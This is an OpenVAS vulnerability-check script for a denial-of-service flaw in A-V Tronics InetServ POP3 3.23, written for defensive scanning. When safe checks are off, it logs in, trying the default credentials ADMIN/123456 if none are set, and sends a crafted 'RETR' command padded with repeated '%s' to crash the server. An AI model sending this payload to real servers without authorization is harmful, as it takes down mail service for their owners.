###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_a_v_tronics_inetserv_pop3_dos_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# A-V Tronics InetServ POP3 Denial Of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to crash the
service.

Impact Level: Application";

tag_affected = "Inetserv POP3 version 3.23. Other versions may also be affected.";

tag_insight = "The flaw is due to the way server handles certain specially
crafted commands which allows remote attackers to cause a denial of service
condition.";

tag_solution ="No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running A-V Tronics InetServ POP3  Server and is
prone to denial of service vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800195");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-01-27 07:47:27 +0100 (Thu, 27 Jan 2011)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");  
  script_name("A-V Tronics InetServ POP3 Denial Of Service Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/16038/");

  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl", "logins.nasl");
  script_require_keys("pop3/login", "pop3/password");
  script_require_ports("Services/pop3", 110);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

##
## The script code starts here
##

include("pop3_func.inc");

## Get the default port of POP3
pop3Port = get_kb_item("Services/pop3");
if(!pop3Port) {
  pop3Port = 110;
}

## Check Port Status
if(!get_port_state(pop3Port)){
  exit(0);
}

## Confirm the application by checking the banner
banner = get_pop3_banner(port:pop3Port);
if(!banner || "POP3 on InetServer" >!< banner){
  exit(0);
}

## If Safecheck is enabled
if(safe_checks())
{
  include("version_func.inc");
  version = eregmatch(pattern:"POP3 on InetServer \(([0-9.]+)\)", string: banner);

  if(!isnull(version[1])) {
    if(version_is_equal(version:version[1],test_version:"3.2.3")) {
      security_message(port:pop3Port);
      exit(0);
    }
  }
  exit(0);
}

## Intrusive Test, which will crash the vulnerable service

## Get User and Pass from KB
user = get_kb_item("pop3/login");
pass = get_kb_item("pop3/password");

## Consider default username nad password,
## If User and Pasword not given in the preference
if (!user || !pass){
  user = "ADMIN";
  pass = "123456";
}

## Open socket with Command
soc1 = open_sock_tcp(pop3Port);
if(!soc1){
  exit(0);
}

# Read banner.
res = recv_line(socket:soc1, length:1024);
if(!res || "POP3 on InetServer" >!< res){
  close(soc1);
  exit(0);
}

## POP3 user and password commands
user_cmd = string("USER ", user);
pass_cmd = string("PASS ", pass);

## Send User login command
send(socket:soc1, data:string(user_cmd, "\r\n"));
res = recv_line(socket:soc1, length:1024);

## Continue, if user is valid
if("+OK user accepted" >< res)
{
  ## Send Password command
  send(socket:soc1, data:string(pass_cmd, "\r\n"));
  res = recv_line(socket:soc1, length:1024);

  ## Continue, If able to login with given username and password
  if("+OK welcome" >< res)
  {
    ## Construct and Send Crafted command
    crafted_cmd = "RETR " + crap(data:string("%s"), length:70);
    send(socket:soc1, data:string(crafted_cmd, "\r\n"));
    res = recv_line(socket:soc1, length:1024);
    close(soc1);

    ## Check still pop3 server is listening
    soc2 = open_sock_tcp(pop3Port);
    if(!soc2){
      security_message(port:pop3Port);
      exit(0);
    }

    ## Some time server listen but doesn't repond,
    ## Hence checking for banner once again
    res = recv_line(socket:soc2, length:1024);
    if(!res || "POP3 on InetServer" >!< res)
    {
      security_message(port:pop3Port);
      close(soc2);
      exit(0);
    }
    close(soc2);
  }
}
close(soc1);
